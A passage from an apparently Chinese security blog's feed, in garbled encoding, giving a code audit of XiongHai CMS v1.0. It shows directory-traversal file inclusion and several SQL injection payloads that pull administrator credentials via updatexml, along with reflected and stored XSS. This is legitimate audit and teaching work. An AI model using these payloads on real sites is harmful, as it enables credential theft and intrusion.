alt="image-20210228140258239"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228140315054.png" alt="image-20210228140315054"></p><p>å½“ç®¡ç†ç™»å½•åå°ï¼ŒæŸ¥çœ‹ç”¨æˆ·çš„æ—¶å€™ï¼Œä¹Ÿä¼šè§¦å‘ï¼ˆå¯æ‹¿ç®¡ç†å‘˜cookieï¼‰ï¼Œè¿™é‡Œæ¨¡æ‹Ÿä¸€ä¸‹ç®¡ç†å‘˜ç™»å½•åå°ã€‚ä¸”å…·æœ‰éšè—æ€§</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210228140444256.png" alt="image-20210228140444256"></p><h3 id="åå°å¤§é‡æ¼æ´"><a href="#åå°å¤§é‡æ¼æ´" class="headerlink" title="åå°å¤§é‡æ¼æ´"></a>åå°å¤§é‡æ¼æ´</h3><p>æ¼æ´æœ‰ç‚¹å¤šï¼Œå°±å…ˆä¸å†™äº†ï¼Œå“ˆå“ˆå“ˆå“ˆï¼</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä»£ç å®¡è®¡ä¹‹BlueCMS-V1-6&quot;&gt;&lt;a href=&quot;#ä»£ç å®¡è®¡ä¹‹BlueCMS-V1-6&quot; class=&quot;headerlink&quot; title=&quot;ä»£ç å®¡è®¡ä¹‹BlueCMS_V1.6&quot;&gt;&lt;/a&gt;ä»£ç å®¡è®¡ä¹‹BlueCMS_V1.6&lt;/h1&gt;&lt;h2 id=&quot;æ¼æ´ç¯å¢ƒ-</summary>
      
    
    
    
    <category term="webå®‰å…¨" scheme="https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://taonn.github.io/categories/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="PHPä»£ç å®¡è®¡" scheme="https://taonn.github.io/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ä»£ç å®¡è®¡ä¹‹ç†Šæµ·CMS_V1.0</title>
    <link href="https://taonn.github.io/2021/02/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E7%86%8A%E6%B5%B7CMS-V1-0/"/>
    <id>https://taonn.github.io/2021/02/01/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E7%86%8A%E6%B5%B7CMS-V1-0/</id>
    <published>2021-02-01T13:35:01.000Z</published>
    <updated>2021-03-16T05:29:44.904Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ¼æ´ç¯å¢ƒ-amp-æ­å»º"><a href="#æ¼æ´ç¯å¢ƒ-amp-æ­å»º" class="headerlink" title="æ¼æ´ç¯å¢ƒ&amp;æ­å»º"></a>æ¼æ´ç¯å¢ƒ&amp;æ­å»º</h2><p>è®¿é—®<code>install</code>ç›®å½•ï¼Œå¡«å†™ç›¸å…³é…ç½®ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="å…¥å£å¤„å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#å…¥å£å¤„å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="å…¥å£å¤„å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´"></a>å…¥å£å¤„å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</h3><p>æ¼æ´è§¦å‘æ–‡ä»¶ä¸º<code>index.php</code>,å…·ä½“ä»£ç å¦‚ä¸‹:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//å•ä¸€å…¥å£æ¨¡å¼</span></span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//å…³é—­é”™è¯¯æ˜¾ç¤º</span></span><br><span class="line">$file=addslashes($_GET[<span class="string">&#x27;r&#x27;</span>]); <span class="comment">//æ¥æ”¶æ–‡ä»¶å</span></span><br><span class="line">$action=$file==<span class="string">&#x27;&#x27;</span>?<span class="string">&#x27;index&#x27;</span>:$file; <span class="comment">//åˆ¤æ–­ä¸ºç©ºæˆ–è€…ç­‰äºindex</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;files/&#x27;</span>.$action.<span class="string">&#x27;.php&#x27;</span>); <span class="comment">//è½½å…¥ç›¸åº”æ–‡ä»¶</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>$file</code>å˜é‡é€šè¿‡GETè¯·æ±‚rå‚æ•°è·å–æ–‡ä»¶åï¼Œç»è¿‡äº†<code>addslashes</code>å‡½æ•°ã€‚ç¬¬5è¡Œé€šè¿‡ä¸‰å…ƒè¿ç®—ç¬¦åˆ¤æ–­æ–‡ä»¶æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºåˆ™è½½å…¥<code>files/index.php</code>æ–‡ä»¶ã€‚åä¹‹èµ‹å€¼åŠ è½½<code>files/$file.php</code>(<code>$action=$file</code>)ã€‚è¿™é‡Œçš„ä»£ç é€»è¾‘è™½ç„¶é™åˆ¶äº†åªèƒ½è®¿é—®<code>files</code>ç›®å½•ä¸‹çš„phpæ–‡ä»¶ï¼ˆå¯¹æ–‡ä»¶è¿›è¡Œäº†æ‹¼æ¥<code>$action.&#39;.php&#39;</code>ï¼‰ã€‚è€Œä¸”<code>addslashes</code>åªè½¬ä¹‰<code>å•å¼•å·ï¼ˆ&#39;ï¼‰</code>,<code>åŒå¼•å·ï¼ˆ&quot;ï¼‰</code>, <code>åæ–œæ ï¼ˆ\ï¼‰</code>,<code>NULL</code></p><p>æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬åªéœ€è¦è§£å†³ä»¥ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼Œå³å¯è§¦å‘ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´</p><ul><li>1.å¦‚ä½•è·³å‡º<code>files</code>ç›®å½•ï¼Ÿ</li><li>2.å¦‚ä½•æˆªæ–­æ‹¼æ¥çš„<code>php</code>åç¼€ï¼Ÿ</li></ul><p>è§£å†³æ–¹æ¡ˆä¹Ÿå¾ˆç®€å•ï¼Œç¬¬ä¸€ç‚¹æˆ‘ä»¬ä½¿ç”¨<code>../</code>å³å¯ã€‚ç¬¬äºŒç‚¹çš„è¯åˆ©ç”¨<strong>ç³»ç»Ÿæ–‡ä»¶è·¯å¾„é•¿åº¦çš„é™åˆ¶</strong>æ¥è§£å†³ã€‚</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows <span class="number">259</span>ä¸ªå­—èŠ‚</span><br><span class="line">Linux <span class="number">4096</span>ä¸ªå­—èŠ‚</span><br></pre></td></tr></table></figure><p>æ¼æ´åˆ©ç”¨ï¼šåœ¨æ ¹ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª<code>tao.txt</code>,æ–‡ä»¶å†…å®¹ä¸º<code>&lt;?php phpinfo();?&gt;</code></p><p>è®¿é—®<code>?r=../tao.txt......</code>(ä¸ºäº†æ’ç‰ˆï¼Œè¿™é‡Œçœç•¥ä¸€æ‰‹ğŸ˜œ)</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301163210626.png" alt="image-20210301163210626"></p><h3 id="UPDATEå‹SQLæ³¨å…¥"><a href="#UPDATEå‹SQLæ³¨å…¥" class="headerlink" title="UPDATEå‹SQLæ³¨å…¥"></a>UPDATEå‹SQLæ³¨å…¥</h3><p>æ¼æ´å‘ç”Ÿåœ¨<code>files/content.php</code>æ–‡ä»¶ä¸­</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301170718042.png" alt="image-20210301170718042"></p><p>ç¬¬8è¡Œä½¿ç”¨äº†<code>addslashes</code>å‡½æ•°å°†<code>$id</code>è¿›è¡Œäº†è½¬ä¹‰ï¼Œè€Œç¬¬14è¡Œçš„SQLè¯­å¥ç”¨äº†å•å¼•å·ä¿æŠ¤<code>$navid</code>å˜é‡ï¼Œé˜²æ­¢SQLæ³¨å…¥ï¼Œä½†æ˜¯19è¡Œå´å­˜åœ¨æ˜æ˜¾çš„UPDATEå‹æ³¨å…¥ï¼Œåˆ©ç”¨æŠ¥é”™æ‰§è¡Œsqlå‘½ä»¤</p><p>æ¼æ´åˆ©ç”¨ï¼š</p><p>payload-&gt;<code>1 or updatexml(1,concat(0x7e,(select concat(user,0x3a,password) from manage)),1)</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301171019946.png" alt="image-20210301171019946"></p><p>æ–‡ä»¶<code>files/software.php</code>13è¡Œä¹Ÿå­˜åœ¨åŒæ ·çš„é—®é¢˜ã€‚è¯­å¥éƒ½ä¸€æ ·ğŸ˜‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301171333891.png" alt="image-20210301171333891"></p><p>ä¿®æ”¹è®¿é—®ä¸º<code>?r=software</code>ã€‚åˆ©ç”¨æŠ¥é”™æ³¨å…¥ï¼Œè·Ÿä¸Šé¢ä¸€æ ·ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301171245102.png" alt="image-20210301171245102"></p><h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><p>æ¼æ´å‘ç”Ÿåœ¨<code>files/submit.php</code>æ–‡ä»¶66è¡Œå¤„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$name=$_POST[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$mail=$_POST[<span class="string">&#x27;mail&#x27;</span>];</span><br><span class="line">$url=$_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">$content=$_POST[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">$cid=$_POST[<span class="string">&#x27;cid&#x27;</span>];</span><br><span class="line">....</span><br><span class="line"><span class="comment">//æŸ¥è¯¢ç”¨æˆ·å¤´åƒæ•°æ®</span></span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM interaction WHERE( mail = &#x27;<span class="subst">$mail</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure><p><code>$mail</code> æœªä½œä»»ä½•è¿‡æ»¤ï¼Œé—­åˆæ‹¬å·ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301185624893.png" alt="image-20210301185624893"></p><h3 id="INSERTå‹SQLæ³¨å…¥"><a href="#INSERTå‹SQLæ³¨å…¥" class="headerlink" title="INSERTå‹SQLæ³¨å…¥"></a>INSERTå‹SQLæ³¨å…¥</h3><p>æ¼æ´å‘ç”Ÿåœ¨<code>files/submit.php</code>æ–‡ä»¶ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$tz=$_POST[<span class="string">&#x27;tz&#x27;</span>];<span class="comment">// ç¬¬11è¡Œ</span></span><br><span class="line">....</span><br><span class="line">$query = <span class="string">&quot;INSERT INTO interaction (// 121è¡Œ</span></span><br><span class="line"><span class="string">type,</span></span><br><span class="line"><span class="string">xs,</span></span><br><span class="line"><span class="string">cid,</span></span><br><span class="line"><span class="string">name,</span></span><br><span class="line"><span class="string">mail,</span></span><br><span class="line"><span class="string">url,</span></span><br><span class="line"><span class="string">touxiang,</span></span><br><span class="line"><span class="string">shebei,</span></span><br><span class="line"><span class="string">ip,</span></span><br><span class="line"><span class="string">content,</span></span><br><span class="line"><span class="string">tz,</span></span><br><span class="line"><span class="string">date</span></span><br><span class="line"><span class="string">) VALUES (</span></span><br><span class="line"><span class="string">&#x27;<span class="subst">$type</span>&#x27;,</span></span><br><span class="line"><span class="string">&#x27;<span class="subst">$xs</span>&#x27;,</span></span><br><span class="line"><span class="string">&#x27;<span class="subst">$cid</span>&#x27;,</span></span><br><span class="line"><span class="string">&#x27;<span class="subst">$name</span>&#x27;,</span></span><br><span class="line"><span class="string">&#x27;<span class="subst">$mail</span>&#x27;,</span></span><br><span class="line"><span class="string">&#x27;<span class="subst">$url</span>&#x27;,</span></span><br><span class="line"><span class="string">&#x27;<span class="subst">$touxiang</span>&#x27;,</span></span><br><span class="line"><span class="string">&#x27;<span class="subst">$shebei</span>&#x27;,</span></span><br><span class="line"><span class="string">&#x27;<span class="subst">$ip</span>&#x27;,</span></span><br><span class="line"><span class="string">&#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">&#x27;<span class="subst">$tz</span>&#x27;,</span></span><br><span class="line"><span class="string">now()</span></span><br><span class="line"><span class="string">)&quot;</span>;</span><br></pre></td></tr></table></figure><p>ç”±äº11è¡Œ<code>$tz</code>POSTè¯·æ±‚ä¼ è¿‡æ¥ï¼Œæœªä½œä»»ä½•å¤„ç†ã€‚</p><p>æ¼æ´åˆ©ç”¨ï¼šåˆ©ç”¨æ€è·¯è·ŸBlueCMSåˆ†æé‡Œé¢ä¸€æ ·ï¼Œæ’å…¥ä¸¤æ¡æ•°æ®(å†…å®¹å¤„æ˜¾ç¤ºå›æ˜¾ç»“æœ)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=Tao&amp;mail=Tao@qq.com&amp;url=http:<span class="comment">//www.baidu.com&amp;content=aaaaaæµ‹è¯•&amp;cid=1&amp;tz=888&#x27;,</span></span><br><span class="line">now()),(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;Tao&#x27;</span>,<span class="string">&#x27;Tao@qq.com&#x27;</span>,<span class="string">&#x27;http://www.baidu.com&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;PC&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;127.0.0.1&#x27;</span>,(select<span class="comment">/*Tao*/</span>user()),<span class="string">&#x27;Tao</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301192359234.png" alt="image-20210301192359234"></p><h3 id="ä¸¤ä¸ªSQLæ³¨å…¥"><a href="#ä¸¤ä¸ªSQLæ³¨å…¥" class="headerlink" title="ä¸¤ä¸ªSQLæ³¨å…¥"></a>ä¸¤ä¸ªSQLæ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$type=addslashes($_GET[<span class="string">&#x27;type&#x27;</span>]);</span><br><span class="line">$cid=$_POST[<span class="string">&#x27;cid&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($type==<span class="string">&#x27;comment&#x27;</span>)&#123;<span class="comment">//75è¡Œ</span></span><br><span class="line">$fhlink=<span class="string">&quot;/?r=content&amp;cid=&quot;</span>.$cid;</span><br><span class="line">$fhname=<span class="string">&quot;è¯„è®º&quot;</span>;</span><br><span class="line">$type=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($pltz==<span class="number">1</span>)&#123;</span><br><span class="line">....</span><br><span class="line">    <span class="keyword">if</span> ($type==<span class="number">1</span>)&#123;</span><br><span class="line">    $query = <span class="string">&quot;SELECT * FROM content WHERE( id= <span class="subst">$cid</span>)&quot;</span>;<span class="comment">// SQLæ³¨å…¥</span></span><br><span class="line">    $result = mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;</span>.mysql_error());</span><br><span class="line">    $wz = mysql_fetch_array($result);</span><br><span class="line">    $title=$wz[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæƒ³è¦åˆ©ç”¨SQLæ³¨å…¥ï¼Œé¦–å…ˆéœ€è¦ä½¿å¾—<code>$pltz==1</code>, ç„¶åä½¿<code>$type==1</code>, è€Œéœ€è¦ä½¿<code>$type=1</code>çš„æ¡ä»¶å°±æ˜¯<code>$type==&#39;comment&#39;</code>ã€‚è€Œè¿™ä¸ªæˆ‘ä»¬æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥äº§ç”Ÿäº†æ­¤æ¼æ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($type==<span class="string">&#x27;download&#x27;</span>)&#123;<span class="comment">// 86è¡Œ</span></span><br><span class="line">    $fhlink=<span class="string">&quot;/?r=software&amp;cid=&quot;</span>.$cid;</span><br><span class="line">    $fhname=<span class="string">&quot;è½¯ä»¶è¯„è®º&quot;</span>;</span><br><span class="line">    $type=<span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line"><span class="keyword">if</span> ($type==<span class="number">3</span>)&#123;</span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM download WHERE( id= <span class="subst">$cid</span>)&quot;</span>;<span class="comment">// SQLæ³¨å…¥</span></span><br><span class="line">$result = mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;</span>.mysql_error());</span><br><span class="line">$wz = mysql_fetch_array($result);</span><br><span class="line">$title=$wz[<span class="string">&#x27;title&#x27;</span>];</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä¸¤ä¸ªSQLæ³¨å…¥æ¼æ´ç‚¹ï¼Œäº§ç”ŸåŸå› ä¸€æ ·ã€‚ä½†æ˜¯æœ‰ç‚¹é¸¡åŠ©ï¼Œå› ä¸ºä½¿<code>$pltz ==1</code>éœ€è¦<code>å¼€å¯æ–°è¯„è®º/ç•™è¨€é€šçŸ¥ç«™é•¿</code>åŠŸèƒ½ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æŸ¥è¯¢ç³»ç»Ÿé«˜çº§è®¾ç½®</span></span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM seniorset&quot;</span>;</span><br><span class="line">$result = mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;</span>.mysql_error());</span><br><span class="line">$advanced = mysql_fetch_array($result);</span><br><span class="line">$lysh=$advanced [<span class="string">&#x27;lysh&#x27;</span>];<span class="comment">//ç•™è¨€å®¡æ ¸</span></span><br><span class="line">$plsh=$advanced [<span class="string">&#x27;plsh&#x27;</span>];<span class="comment">//è¯„è®ºå®¡æ ¸</span></span><br><span class="line">$pltz=$advanced [<span class="string">&#x27;pltz&#x27;</span>];<span class="comment">//æ–°ç•™è¨€è¯„è®ºé€šçŸ¥</span></span><br><span class="line"><span class="keyword">if</span> ($pltz==<span class="number">1</span>)&#123;</span><br><span class="line">......</span><br><span class="line">   <span class="keyword">if</span> ($type==<span class="number">1</span>)&#123;</span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM content WHERE( id= <span class="subst">$cid</span>)&quot;</span>;<span class="comment">// SQLæ³¨å…¥</span></span><br><span class="line">     ....</span><br><span class="line">   <span class="keyword">if</span> ($type==<span class="number">3</span>)&#123;</span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM download WHERE( id= <span class="subst">$cid</span>)&quot;</span>;<span class="comment">// SQLæ³¨å…¥</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210302153826366.png" alt="image-20210302153826366"></p><p>éœ€è¦ä½¿<code>$pltz ==1</code>ï¼Œæ‰ä¼šè¿›å…¥<code>if ($type==1)</code>ã€‚ç„¶åæ‰§è¡Œsqlè¯­å¥ï¼Œè€Œ<code>$pltz</code>æ˜¯ä»<code>seniorset</code>è¡¨ä¸­æ¥çš„ï¼ˆå¼€å¯æ–°è¯„è®º/ç•™è¨€é€šçŸ¥ç«™é•¿åŠŸèƒ½ï¼‰ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301220616501.png" alt="image-20210301220616501"></p><p>ä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œç®€æ´çš„æ•´ç†äº†ä¸€ä¸‹æ‰§è¡Œçš„æµç¨‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$cid=$_POST[<span class="string">&#x27;cid&#x27;</span>];</span><br><span class="line"><span class="comment">//æŸ¥è¯¢ç³»ç»Ÿé«˜çº§è®¾ç½®</span></span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM seniorset&quot;</span>;</span><br><span class="line">$result = mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;</span>.mysql_error());</span><br><span class="line">$advanced = mysql_fetch_array($result);</span><br><span class="line">$lysh=$advanced [<span class="string">&#x27;lysh&#x27;</span>];<span class="comment">//ç•™è¨€å®¡æ ¸</span></span><br><span class="line">$plsh=$advanced [<span class="string">&#x27;plsh&#x27;</span>];<span class="comment">//è¯„è®ºå®¡æ ¸</span></span><br><span class="line">$pltz=$advanced [<span class="string">&#x27;pltz&#x27;</span>];<span class="comment">//æ–°ç•™è¨€è¯„è®ºé€šçŸ¥</span></span><br><span class="line"><span class="keyword">if</span> ($pltz==<span class="number">1</span>)&#123;</span><br><span class="line">....</span><br><span class="line"><span class="keyword">if</span> ($type==<span class="number">1</span>)&#123;</span><br><span class="line">        $query = <span class="string">&quot;SELECT * FROM content WHERE( id= <span class="subst">$cid</span>)&quot;</span>;</span><br><span class="line">        $result = mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;</span>.mysql_error());</span><br><span class="line">        $wz = mysql_fetch_array($result);</span><br><span class="line">    .....</span><br><span class="line">    <span class="keyword">if</span> ($type==<span class="number">3</span>)&#123;</span><br><span class="line">        $query = <span class="string">&quot;SELECT * FROM download WHERE( id= <span class="subst">$cid</span>)&quot;</span>;</span><br><span class="line">        $result = mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQLè¯­å¥æœ‰è¯¯ï¼š&#x27;</span>.mysql_error());</span><br><span class="line">        $wz = mysql_fetch_array($result);</span><br><span class="line">        $title=$wz[<span class="string">&#x27;title&#x27;</span>];</span><br><span class="line">.....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ¼æ´åˆ©ç”¨çš„å‰æ<code>$pltz==1</code>,ä¹Ÿå°±æ˜¯åå°é«˜çº§è®¾ç½®<code>å¼€å¯æ–°è¯„è®º/ç•™è¨€é€šçŸ¥ç«™é•¿</code>åŠŸèƒ½æ˜¯æ‰“å¼€çš„ã€‚</p><p>æ¼æ´åˆ©ç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=Tao&amp;mail=Tao1@qq.com&amp;url=http:<span class="comment">//www.baidu.com&amp;content=Taoæµ‹è¯•æµ‹è¯•å“ˆå“ˆå“ˆå“ˆ&amp;cid=1)+or+updatexml(1,concat(0x7e,(select+concat(user,0x3a,password)+from+manage)),1)#</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301220711917.png" alt="image-20210301220711917"></p><p><code>$type=&#39;comment&#39;=1</code>è§¦å‘</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301220750431.png" alt="image-20210301220750431"></p><p><code>$type=&#39;download&#39;=3</code>è§¦å‘</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301221126900.png" alt="image-20210301221126900"></p><h3 id="åå°„å‹xss"><a href="#åå°„å‹xss" class="headerlink" title="åå°„å‹xss"></a>åå°„å‹xss</h3><p>æ¼æ´è§¦å‘åœ¨<code>files/contact.php</code>æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$page=addslashes($_GET[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> ($page&lt;&gt;<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> ($page&lt;&gt;<span class="number">1</span>)&#123;</span><br><span class="line">$pages=<span class="string">&quot;ç¬¬&quot;</span>.$page.<span class="string">&quot;é¡µ - &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 12~15è¡Œ</span></span><br></pre></td></tr></table></figure><p><code>$_GET[&#39;page&#39;]</code>æœªè¿›è¡Œåªè¿›è¡Œäº†éƒ¨åˆ†å­—ç¬¦è½¬ä¹‰ï¼Œå…¶ä»–æœªä½œå¤„ç†å°±ç›´æ¥è¾“å‡ºäº†ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301221857376.png" alt="image-20210301221857376"></p><p>æ¼æ´è§¦å‘åœ¨<code>files/list.php</code>æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$yemas=$_GET[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($yemas&lt;&gt;<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">$yema=<span class="string">&quot; - ç¬¬ <span class="subst">$yemas</span> é¡µ&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$yema=<span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 23~28è¡Œ</span></span><br></pre></td></tr></table></figure><p>è·Ÿä¸Šé¢åŒç†</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301222000693.png" alt="image-20210301222000693"></p><p>æ¼æ´è§¦å‘åœ¨<code>files/download.php</code>æ–‡ä»¶</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20210301222140854.png" alt="image-20210301222140854"></p><h3 id="å­˜å‚¨å‹xss"><a href="#å­˜å‚¨å‹xss" class="headerlink" title="å­˜å‚¨å‹xss"></a>å­˜å‚¨å‹xss</h3><p>æ¼æ´äº§ç”Ÿåœ¨<code>files/submit.php</code>æ–‡ä»¶ä¸­ï¼Œæ˜µç§°æœªè¿›è¡Œå¤„ç†ï¼Œä¾¿å­˜å‚¨åˆ°æ•°æ®åº“ä¸­</p><figure class="highlight 